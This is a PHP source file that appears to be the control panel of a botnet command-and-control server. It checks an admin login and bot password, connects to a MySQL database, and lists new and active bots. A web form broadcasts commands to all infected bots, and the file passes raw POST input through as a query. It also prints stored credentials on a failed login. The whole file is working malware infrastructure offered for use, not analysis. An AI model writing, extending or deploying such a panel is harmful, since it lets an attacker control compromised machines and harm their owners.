<?php

//error_reporting(E_ALL);
include ("cANDcfunc.php");
include("config.php"); 

if (($adminlogin != $_POST['LGN']) || ($botpw != $_POST['PWD'])) {
	echo("Incorrect username or password");
	echo($adminlogin . " " . $_POST['LGN'] . " " . $botpw . " " . $_POST['PWD']);
	die;
}

$conn = mysql_connect($server,$user,$dbpwd) or die("Connect failed!");
$db = mysql_select_db($dbname) or die("Wrong database!");

if (($_POST['sql'] != NULL) && ($_POST['command'] != NULL)) {
	echo 'A new command will be set<br />';
	$b00l = SetBotCommand($_POST['sql'], $_POST['command']);
	if($b00l == FALSE) {
		die("Something was wrong with your query<br>");;
	}
}

echo 'New Bots Today: ';
NewBots();
ShowAllBots($timeout);

echo "<form action='control.php' method='POST'>\n<input type='hidden' name='PWD' value='" . $password . "'>";
echo "Send To All Bots: <input name='sql' type='text' size='30' maxlength='30'>
	<br>Command: <input name='command' type='text' size='50' maxlength='100'><br />
	<input type='submit' value='Submit'>
</form>";

?>